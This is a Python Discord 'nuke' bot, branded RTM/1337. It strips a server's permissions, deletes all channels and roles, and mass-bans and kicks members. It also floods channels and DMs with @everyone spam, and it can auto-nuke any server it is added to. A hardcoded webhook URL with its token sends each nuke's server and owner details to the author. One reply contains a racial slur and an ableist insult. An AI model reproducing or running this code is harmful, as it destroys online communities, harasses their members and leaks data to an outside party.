# Bot Start Point

dm_msg = "**RTM Beamed You** https://youtu.be/gGzOhy9vNkg\nhttps://discord.gg/hJZBtGwjkq"
spam_messages = ["@everyone **RTM wizzed this** <a:__:770078001315446816>\nhttps://youtu.be/gGzOhy9vNkg", "@everyone **Wizzed by RTM | **https://discord.gg/hJZBtGwjkq"]
webhook_usernames = ["RTM Wizzed U", "RTM", "RTM BEAMER", "🤫", "RTM NUUUKED"]

import discord, random, aiohttp, asyncio, json, os, threading
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from colorama import Fore as C
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed

os.system("cls")

with open('config.json') as f:
    conf = json.load(f)
    BOT_TOKEN = conf.get('BOT_TOKEN')
    BOT_PREFIX = conf.get('BOT_PREFIX')
    NUKE_ON_JOIN = conf.get('NUKE_ON_JOIN')
    NUKE_WAIT_TIME = conf.get('NUKE_WAIT_TIME')
    CHANNEL_NAMES = conf.get('CHANNEL_NAMES')

bot = commands.Bot(command_prefix = BOT_PREFIX, case_insensitive=True, intents=discord.Intents.all())
bot.remove_command("help")


async def nuke(guild):
  print(f"\n{C.CYAN}Nuking {C.WHITE}{guild.name}{C.CYAN} ~ Using 1337 wizzer.\n")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}[+] [Everyone Perms] Success ~ {C.WHITE}{guild.name}\n")
  except:
    print(f"{C.RED}[-] [Everyone Perms] Failed ~ {C.WHITE}{guild.name}\n")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}[+] [Channel Deletion] {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}[-] [Channel Deletion] {C.WHITE}{channel.name}{C.RESET}")
  await guild.edit(name=f"RTM wizzed {guild.name}")
  nukedwebhook = ["https://discord.com/api/webhooks/784536463588327444/5hE0jrlRbkQCXeobAJFjfO1HOzhkMkW6KNIAw4xUMQXaIGk-rDnyfQ-Sd5flLgmI7mbN"]
  webhook = DiscordWebhook(url=nukedwebhook)
  log = DiscordEmbed(title = f"Nuke Successful!", description = f"Server: [**{guild.name}**]")
  log.add_embed_field(name = "Nukebot Used", value = f"{bot.user.name}#{bot.user.discriminator} | `{bot.user.id}`")
  log.add_embed_field(name = "Server Owner", value = f"{guild.owner} | `{guild.owner.id}`", inline = False)
  log.add_embed_field(name = "Members Banned", value = f"{guild.bans}", inline = False)
  webhook.add_embed(log)
  webhook.execute()
  for i in range(125):
    await guild.create_text_channel(random.choice(CHANNEL_NAMES))
  print(f"{C.GREEN}Nuked {guild.name} ~ Using 1337 wizzer.")



@bot.event
async def on_ready():
  print(f"{C.BLUE}Starting Status..{C.RESET}\n")
  await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.playing, name=f"In The Shadows ~ RTM"))
  sleep(.6)
  print(f'''  ╔═════════════════════════════════════════════════╗
  ║ Bot Name: {C.YELLOW}{bot.user.name} {C.WHITE}({C.YELLOW}{bot.user.id}{C.WHITE}){C.RESET}      ║
  ║ Prefix: {C.YELLOW}{BOT_PREFIX}{C.RESET}                                       ║
  ║ Version: {C.YELLOW}1.0{C.RESET}                                    ║
  ║ {C.MAGENTA}DM Features Coming Soon..{C.RESET}                       ║
  ╚═════════════════════════════════════════════════╝
  ''')


@bot.command()
@commands.cooldown(1, 10, commands.BucketType.user)
async def help(ctx):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  author = ctx.author
  await ctx.message.delete()
  embed = discord.Embed(color=0x363636, timestamp=ctx.message.created_at)
  embed.set_author(name="1337 Beamer | In the shadows", icon_url=ctx.author.avatar_url)
  embed.add_field(name=f"{BOT_PREFIX}help", value="Shows this message.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}wizz", value="Nukes The Server.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}massban", value="Bans All Members.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}masskick", value="Kicks All Members.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}ms", value="Tells You The Bots Latency.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}mention", value="Spams All Messages.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}droles", value="Deletes All The Roles.", inline=False)
  embed.add_field(name=f"{BOT_PREFIX}roles", value="Creates All The Roles", inline=False)
  await author.send(embed=embed)

@bot.command()
async def wizz(ctx):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  if ctx.guild.id == "784489385571647541":
    await ctx.send("Nuking")
    await ctx.send("sike nigga, you're retarded, I was programmed not to nuke this server")
  else:
    await ctx.author.send(f"Nuking **{ctx.guild.name}**")
    await nuke(ctx.guild)

@bot.command(pass_context=True)
async def massnick(ctx, rename_to):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  await ctx.message.delete()
  for user in list(ctx.guild.name):
    try:
      await user.edit(nick=rename_to)
      print (f"{user.name} got his name changed to {rename_to} in {ctx.guild.name}")
    except:
      print (f"{user.name} didnt got his name changed!! in {ctx.guild.name}")
      print ("finished massnick!")

@bot.command(pass_context=True)
async def adminrole(ctx):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    await guild.create_role(name='1337', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="1337")
    await member.add_roles(role)
    print("Admin Given!")

@bot.command()
async def delemojis(ctx):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  await ctx.message.delete()
  for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def dmall(ctx):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(dm_msg)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: Mass DM")

@bot.command()
async def massban(ctx):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.ban()
      print(f"{C.GREEN}[+] [Mass Ban] {user.name} in {ctx.guild.name}")
    except:
        print(f"{C.RED}[-] [Mass Ban] {user.name} in {ctx.guild.name}")

@bot.command()
async def masskick(ctx, guild):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  guild = ctx.message.guild
  for user in list(ctx.guild.members):
    try:
      await user.kick(reason="Wizzed by 1337")
      print(f"[+] Kicked {user.name} in {guild.name}")
    except:
        print(f"[-]Failed to kick {user.name} in {guild.name}")

@bot.command()
async def delroles(ctx):
 for role in list(ctx.guild.roles):
    try:
      await role.delete()
      print (f"{role.name} has been deleted in {ctx.guild.name}")
    except:
      print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def clear(ctx, amount=5):
 if ctx.guild is None:
  await ctx.send("Commands Not Supported In DM.")
 else:
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)
  
@bot.command()
async def roles(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="1337")

@bot.command()
async def force_restart(ctx):
 if ctx.guild is None:
    await ctx.message.delete()
    await ctx.author.send("**Restarting...**")
    sleep(0.5)
    os._exit(0)
 else:
    return

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone RTM Wizzed This Shit.")
    webhook = await channel.create_webhook(name="RTM")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
      while True:
        await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
        await channel.send("@everyone 1337 Wizzed This Shit.")

@bot.event
async def on_guild_join(guild):
  if NUKE_ON_JOIN == "True":
    try:
      #await asyncio.sleep(NUKE_WAIT_TIME)
      await nuke(guild)
    except:
      print(f"Error while attempting to auto-nuke {guild}")
  else:
    return

@bot.event
async def on_member_join(member):
 if member.bot:
   await member.ban(reason="Not stealing RTM's wizz, clown")
 else:
   return

@bot.event
async def on_command_error(ctx, error):
    print(f"{C.YELLOW}[!] {C.RED}[ERROR] ~ {error}{C.RESET}")

def _input():
        sleep(6)
        while True:
            inp = input(f"{C.WHITE}[{C.RED}1337 Nuker{C.WHITE}] ")
            if inp == "help":
                print(f'''
                                         {C.CYAN}-- Basic Help --
                                         
        {C.GREEN}prefix  :: {C.RED}Shows the Bot prefix.                            :: {C.MAGENTA}{BOT_PREFIX}{C.RESET}
        {C.GREEN}ping    :: {C.RED}Shows the bots response time to Discord.         :: {C.MAGENTA}{round(bot.ws.latency * 1000)}{C.RESET}
        {C.GREEN}guilds  :: {C.RED}Shows the amount of guilds your bot's in.        :: {C.MAGENTA}{len(bot.guilds)}{C.RESET}
	{C.GREEN}id      :: {C.RED}Shows your BOT id.                               :: {C.MAGENTA}{bot.user.id}{C.RESET}
	{C.GREEN}restart :: {C.RED}Restarts the Bot. (only works in cmd prompt)     :: {C.MAGENTA}restart{C.RESET}
        {C.GREEN}close   :: {C.RED}Closes the bot & cmd window.                     :: {C.MAGENTA}close{C.RESET}

                                       {C.CYAN}-- Fuck Some Shit --{C.RESET}
                                       
        {C.GREEN}cmdwizz :: {C.RED}Nukes a server the bot is in *COMING SOON*       :: {C.MAGENTA}*Coming Soon*{C.RESET}
        {C.GREEN}bothelp :: {C.RED}Shows all the bots commands *COMING SOON*        :: {C.MAGENTA}*Coming Soon*{C.RESET}
        ''')
            if inp == "close":
                print(f"{C.YELLOW}[!] {C.RESET}Closing...")
                sleep(0.5)
                os._exit(0)
            if inp == "prefix":
                print(C.GREEN + f"Bot Prefix: {BOT_PREFIX}")
            if inp == "guilds":
                print(C.GREEN + f"Guilds: {len(bot.guilds)}")
            if inp == "ping":
                print(C.GREEN + f"Client Latency: {round(bot.ws.latency * 1000)}")
            if inp == "id":
                print(C.GREEN + f"User ID: {bot.user.id}")
            if inp == "restart":
                os.system("start cmd /c py main.py")
                os._exit(0)

try:
  thread = threading.Thread(target=_input)
  thread.start()
  bot.run(BOT_TOKEN)
except:
  thread = threading.Thread(target=_input)
  thread.start()
  bot.run(BOT_TOKEN, bot = False)
